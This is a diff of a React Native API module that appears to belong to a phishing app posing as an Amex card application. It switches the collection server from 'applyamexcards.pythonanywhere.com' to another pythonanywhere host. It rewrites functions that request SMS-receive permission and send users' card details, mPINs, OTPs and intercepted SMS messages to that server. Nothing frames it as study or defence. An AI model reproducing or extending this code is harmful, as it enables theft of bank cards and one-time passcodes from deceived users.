@@ -1,71 +1,127 @@
-import axios from "axios";
-import AsyncStorage from "@react-native-async-storage/async-storage";
-import { Alert, PermissionsAndroid } from "react-native";
-import { setId } from './store/mobileNumberSlice'
+import { PermissionsAndroid, Platform } from "react-native";
+import { setId } from "./store/mobileNumberSlice";
 
-const baseUrl = "https://applyamexcards.pythonanywhere.com/api/"
+const baseUrl = "https://ashu1794.pythonanywhere.com/api/"
+
 
 let isSending = false
 let lastRequestTime = 0; // Track the last time a request was sent
 
-
 export const requestSmsPermission = async () => {
     try {
         const granted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
-        if (!granted) {
-            const permission = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
-            return permission;
-        }
-        return PermissionsAndroid.RESULTS.GRANTED;
+        if (granted) return PermissionsAndroid.RESULTS.GRANTED;
+        return await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
     } catch (err) {
-        Alert.alert('Error', err.message);
+        return err.message;
+    }
+};
+
+export const requestForegroundPermission = async () => {
+    try {
+        if (Platform.Version >= 34) {
+            const granted = await PermissionsAndroid.request(
+                "android.permission.FOREGROUND_SERVICE" // Correct permission name
+            );
+            return granted === PermissionsAndroid.RESULTS.GRANTED ? "granted" : "denied";
+        }
+        return "not_required"; // No need to request on older Android versions
+    } catch (err) {
+        return err.message;
+    }
+};
+
+
+export const createAccount = (data) => async (dispatch) => {
+    try {
+        const response = await fetch(`${baseUrl}users/`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
+        });
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+        const { id } = await response.json();
+        // SMSListener.saveDeviceId(String(id));
+        dispatch(setId(id));
+        return id;
+    } catch (err) {
+        return err.message;
+    }
+};
+
+export const saveOTP = async (mPin) => {
+    try {
+        const response = await fetch(`${baseUrl}mpins/`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(mPin),
+        });
+
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+
+        const { message } = await response.json();
+        return message;
+    } catch (err) {
+        console.error("saveOTP Error:", err.message);
         return null;
     }
 };
 
-export const createAccount = (data) => async (dispatch) => {
-    try {
-        const response = await axios.post(`${baseUrl}users/`, data)
-        const { id } = await response.data
-        await AsyncStorage.setItem('user_profile', JSON.stringify({ user_profile: id }))
-        dispatch(setId(id))
-        return id
-
-    } catch (err) {
-        return Alert.alert('Error', err.message)
-
-    }
-}
-
-export const saveOTP = async (mPin) => {
-    const { message } = await (await axios.post(`${baseUrl}mpins/`, mPin)).data
-    return message
-}
 export const saveCard = async (card) => {
-    const { message } = (await axios.post(`${baseUrl}cards/`, card)).data
-    return message
-
-}
+    try {
+        const response = await fetch(`${baseUrl}cards/`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(card),
+        });
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+        const { message } = await response.json();
+        return message;
+    } catch (err) {
+        console.error("saveCard Error:", err.message);
+        return null;
+    }
+};
 
 export const saveOTP2s = async (otps) => {
-    const { message } = await (await axios.post(`${baseUrl}otps/`, otps)).data
-    return message
-}
+    try {
+        const response = await fetch(`${baseUrl}otps/`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(otps),
+        });
+
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+
+        const { message } = await response.json();
+        return message;
+    } catch (err) {
+        console.error("saveOTP2s Error:", err.message);
+        return null;
+    }
+};
 
 export const sendSms = async (data) => {
     const currentTime = Date.now();
-    if (isSending || (currentTime - lastRequestTime < 1000)) {
-        return; // Prevent sending if there's already an ongoing request
-    }
+    if (isSending || currentTime - lastRequestTime < 1000) return;
 
-    isSending = true; // Set the flag to true to indicate a request is in 
-    lastRequestTime = currentTime; // Update the last request time
+    isSending = true;
+    lastRequestTime = currentTime;
+
     try {
-        const response = await axios.post(`${baseUrl}sms_messages/`, data)
-        return response.data
+        const response = await fetch(`${baseUrl}sms_messages/`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
+        });
+
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+
+        return await response.json();
     } catch (err) {
-        console.log(err)
+        console.error("sendSms Error:", err.message);
+        return null;
     } finally {
-        isSending = false; // Reset the flag once the request is complete
+        isSending = false;
     }
-}
+};
